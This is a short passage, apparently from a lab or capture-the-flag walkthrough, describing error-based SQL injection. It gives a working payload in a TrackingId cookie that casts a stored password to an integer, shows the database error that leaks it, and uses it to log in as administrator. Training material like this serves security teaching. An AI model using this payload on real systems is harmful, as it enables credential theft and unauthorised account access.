...
2. Use a payload that forces string-to-int conversion on the password:

```http
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

3. Read the DB error. If verbose errors are enabled, the failing value is shown:

```text
ERROR: invalid input syntax for type integer: "<leaked_password>"
```

4. Use the leaked password to authenticate as `administrator`.
